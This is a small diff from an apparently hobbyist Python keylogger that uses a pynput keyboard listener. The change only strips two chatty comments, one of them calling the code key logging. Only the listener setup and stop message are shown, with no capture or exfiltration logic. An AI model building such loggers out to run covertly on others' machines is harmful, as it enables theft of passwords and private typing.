@@ -25,5 +25,5 @@ def on_press(key):
         print("Logger terminated")    #let me know it's done.   
         return False      
     
-with Listener(on_press = on_press) as listener:  #I had a difficult time understanding this bit, since I started programming Python 12 hours ago lol
-    listener.join() #but I wrote a random text file with this statement (key logging) and it made A LOT more sense.
+with Listener(on_press = on_press) as listener:  
+    listener.join() 
